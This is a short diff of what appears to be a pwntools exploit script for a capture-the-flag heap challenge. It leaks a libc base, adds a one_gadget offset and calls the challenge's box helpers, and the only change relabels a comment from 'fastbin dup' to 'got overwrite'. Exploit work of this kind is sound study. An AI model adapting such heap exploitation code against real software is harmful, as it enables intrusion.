@@ -128,7 +128,7 @@ libc = u64(s.recv(6) + "\x00" * 2) - 0x959988
 oneshot = libc + 0x4526a
 log.info("LIBC : " + hex(libc))
 
-# fastbin dup
+# got overwrite
 delete_box('1')
 box2box('0','0','1','5')
 box2box('0','0','1','6')
